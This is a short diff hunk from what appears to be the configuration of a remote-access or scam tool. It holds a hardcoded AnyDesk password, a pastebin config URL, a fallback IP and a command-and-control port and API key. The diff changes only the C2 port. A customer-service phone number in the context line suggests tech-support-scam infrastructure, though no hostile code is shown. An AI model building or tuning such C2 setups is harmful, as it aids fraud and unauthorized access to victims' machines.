@@ -107,7 +107,7 @@ Customer Service: 1-800-432-1000
 ANYDESK_PASSWORD = "secretsauce123"
 CONFIG_URL = "https://pastebin.com/raw/YgNuztHj"
 FALLBACK_IP = "52.21.29.104"
-C2_PORT = 8080
+C2_PORT = 8443  # HTTP port for C2 API (FastAPI)
 C2_API_KEY = "kestrel_c2_2024_secure_key_f8a9b2c1d4e5"  # API key for authentication
 
 
